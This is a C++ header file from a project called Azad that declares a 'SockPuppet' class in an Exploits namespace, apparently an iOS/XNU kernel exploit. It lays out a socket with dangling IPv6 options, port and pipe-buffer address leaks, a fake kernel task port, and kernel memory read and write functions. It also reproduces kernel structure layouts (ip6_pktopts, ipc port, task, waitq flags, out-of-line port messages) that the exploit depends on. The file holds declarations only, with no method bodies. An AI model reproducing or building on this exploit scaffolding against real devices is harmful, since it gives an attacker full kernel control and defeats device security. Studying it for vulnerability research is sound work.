//
//  SockPuppet.hpp
//  Azad
//
//  Created by Umang Raghuvanshi on 02/08/19.
//  Copyright © 2019 Umang Raghuvanshi. All rights reserved.
//

#ifndef SockPuppet_hpp
#define SockPuppet_hpp

#include "Utility.hpp"
#include <vector>

extern "C" {
#include <netinet/in.h>
#include <sys/socket.h>
}

namespace Azad {
namespace Exploits {
    class SockPuppet {
    private:
        uint64_t leakPortAddress(mach_port_t portname);
        int socketWithDanglingOptions;
        uint64_t currentTaskAddr;
        std::vector<uint8_t> leak20AndFree(uint64_t address, bool free = false);
        uint64_t earlyRead64(uint64_t address);
        uint64_t leakPipeBufferAddress(int fd, uint64_t* bufferptr = 0);
        int portPointerOverwritePipes[2];
        int fakePortPipes[2];
        mach_port_t kernelTaskPort = MACH_PORT_NULL;

    public:
        SockPuppet();
        bool run();
        mach_port_t getFakeKernelTaskPort();

        size_t readKernelMemory(uint64_t address, uint8_t* buffer, size_t bufferSize);
        size_t writeKernelMemory(uint64_t address, uint8_t* data, size_t dataSize);
    };

    struct route_in6 {
        struct rtentry* ro_rt;
        struct llentry* ro_lle;
        struct ifaddr* ro_srcia;
        uint32_t ro_flags;
        struct sockaddr_in6 ro_dst;
    };

    struct ip6po_rhinfo {
        struct ip6_rthdr* ip6po_rhi_rthdr; /* Routing header */
        struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
    };

    struct ip6po_nhinfo {
        struct sockaddr* ip6po_nhi_nexthop;
        struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
    };

    struct ip6_pktopts {
        struct mbuf* ip6po_m;
        int ip6po_hlim;
        struct in6_pktinfo* ip6po_pktinfo;
        struct ip6po_nhinfo ip6po_nhinfo;
        struct ip6_hbh* ip6po_hbh;
        struct ip6_dest* ip6po_dest1;
        struct ip6po_rhinfo ip6po_rhinfo;
        struct ip6_dest* ip6po_dest2;
        int ip6po_tclass;
        int ip6po_minmtu;
        int ip6po_prefer_tempaddr;
        int ip6po_flags;
    };

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2

    typedef volatile struct {
        uint32_t ip_bits;
        uint32_t ip_references;
        struct {
            uint64_t data;
            uint64_t type;
        } ip_lock; // spinlock
        struct {
            struct {
                struct {
                    uint32_t flags;
                    uint32_t waitq_interlock;
                    uint64_t waitq_set_id;
                    uint64_t waitq_prepost_id;
                    struct {
                        uint64_t next;
                        uint64_t prev;
                    } waitq_queue;
                } waitq;
                uint64_t messages;
                uint32_t seqno;
                uint32_t receiver_name;
                uint16_t msgcount;
                uint16_t qlimit;
                uint32_t pad;
            } port;
            uint64_t klist;
        } ip_messages;
        uint64_t ip_receiver;
        uint64_t ip_kobject;
        uint64_t ip_nsrequest;
        uint64_t ip_pdrequest;
        uint64_t ip_requests;
        uint64_t ip_premsg;
        uint64_t ip_context;
        uint32_t ip_flags;
        uint32_t ip_mscount;
        uint32_t ip_srights;
        uint32_t ip_sorights;
    } kport_t;

    typedef struct {
        struct {
            uint64_t data;
            uint32_t reserved : 24, type : 8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        uint64_t map;
        char padding[0x400];
    } ktask_t;

#define WQT_QUEUE 0x2
#define _EVENT_MASK_BITS ((sizeof(uint32_t) * 8) - 7)

    union waitq_flags {
        struct {
            uint32_t /* flags */
                waitq_type : 2, /* only public field */
                waitq_fifo : 1, /* fifo wakeup policy? */
                waitq_prepost : 1, /* waitq supports prepost? */
                waitq_irq : 1, /* waitq requires interrupts disabled */
                waitq_isvalid : 1, /* waitq structure is valid */
                waitq_turnstile_or_port : 1, /* waitq is embedded in a turnstile (if irq
                                        safe), or port (if not irq safe) */
                waitq_eventmask : _EVENT_MASK_BITS;
        };
        uint32_t flags;
    };

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_ports;
    };
} // namespace Exploits
} // namespace Azad

#endif /* SockPuppet_hpp */
